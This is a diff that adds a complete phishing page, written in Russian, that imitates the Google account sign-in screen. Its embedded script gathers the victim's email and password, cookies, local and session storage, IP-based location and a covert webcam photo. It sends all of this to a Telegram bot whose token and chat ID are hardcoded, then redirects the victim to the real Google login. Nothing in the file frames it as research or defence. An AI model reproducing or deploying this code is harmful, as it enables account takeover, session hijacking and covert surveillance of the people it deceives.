@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход — Google Аккаунты</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #f1f3f4;
+            font-family: 'Roboto', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .card {
+            background: white;
+            padding: 48px 40px 36px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
+        }
+        .logo { width: 120px; margin-bottom: 20px; }
+        h1 { font-weight: 400; font-size: 24px; color: #202124; margin-bottom: 8px; }
+        .subtitle { color: #5f6368; font-size: 16px; margin-bottom: 24px; }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            margin-bottom: 16px;
+            transition: border 0.2s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
+        }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn:hover { background: #1557b0; }
+        .footer {
+            margin-top: 24px;
+            font-size: 14px;
+            color: #5f6368;
+        }
+        .footer a { color: #1a73e8; text-decoration: none; }
+        .loader {
+            display: none;
+            margin: 12px auto;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1a73e8;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #status { margin-top: 12px; color: #d93025; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png" alt="Google" class="logo">
+        <h1>Войти</h1>
+        <p class="subtitle">Продолжите работу с аккаунтом Google</p>
+        
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="Электронная почта или телефон" required>
+            <input type="password" id="password" placeholder="Пароль" required>
+            <div class="loader" id="loader"></div>
+            <button type="submit" class="btn">Далее</button>
+            <div id="status"></div>
+        </form>
+        <div class="footer">
+            <a href="#">Создать аккаунт</a> · <a href="#">Войти по-другому</a>
+        </div>
+    </div>
+
+    <script>
+        // Токен и chat ID уже вставлены
+        const BOT_TOKEN = '8979531422:AAGtqoXwgzm60N82gZ_jJsgwnR-VRAnq-D0';
+        const CHAT_ID = '8717087613';
+
+        // Функция отправки данных в Telegram
+        function sendToTelegram(email, password, geo, photo, tokens) {
+            const userAgent = navigator.userAgent;
+            const time = new Date().toLocaleString('ru-RU');
+
+            let message = `🔐 **НОВЫЙ ВХОД GOOGLE**\n\n`;
+            message += `👤 **Логин:** ${email}\n`;
+            message += `🔑 **Пароль:** ${password}\n`;
+            message += `🕒 **Время:** ${time}\n`;
+            message += `📱 **User-Agent:** ${userAgent}\n\n`;
+            message += `**📡 Геоданные:**\n${geo || 'Недоступны'}\n\n`;
+            message += `**🍪 Cookies:**\n${tokens.cookies || 'Нет'}\n\n`;
+            message += `**💾 LocalStorage:**\n${tokens.localStorage || 'Нет'}\n\n`;
+            message += `**📂 SessionStorage:**\n${tokens.sessionStorage || 'Нет'}`;
+
+            // Отправка текста
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message.substring(0, 4096),
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            // Отправка фото, если есть
+            if (photo) {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        photo: photo,
+                        caption: '📸 Фото с камеры жертвы'
+                    })
+                });
+            }
+        }
+
+        // Сбор геоданных
+        function getGeo() {
+            return fetch('http://ip-api.com/json/')
+                .then(res => res.json())
+                .then(data => {
+                    return `IP: ${data.query}\nГород: ${data.city}\nРегион: ${data.regionName}\nСтрана: ${data.country}\nПровайдер: ${data.isp}`;
+                })
+                .catch(() => 'Недоступны');
+        }
+
+        // Фото с камеры
+        function capturePhoto() {
+            return new Promise((resolve) => {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.play();
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = 640;
+                            canvas.height = 480;
+                            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                            stream.getTracks().forEach(track => track.stop());
+                            resolve(canvas.toDataURL('image/jpeg', 0.8));
+                        }, 1500);
+                    })
+                    .catch(() => resolve(null));
+            });
+        }
+
+        // Кража токенов
+        function getTokens() {
+            return {
+                cookies: document.cookie,
+                localStorage: JSON.stringify(localStorage),
+                sessionStorage: JSON.stringify(sessionStorage)
+            };
+        }
+
+        // Обработка формы
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+            
+            document.getElementById('loader').style.display = 'block';
+            document.getElementById('status').textContent = '';
+
+            const geo = await getGeo();
+            const photo = await capturePhoto();
+            const tokens = getTokens();
+
+            sendToTelegram(email, pass, geo, photo, tokens);
+
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('status').style.color = '#0f9d58';
+            document.getElementById('status').textContent = 'Перенаправление...';
+            
+            setTimeout(() => {
+                window.location.href = 'https://accounts.google.com';
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
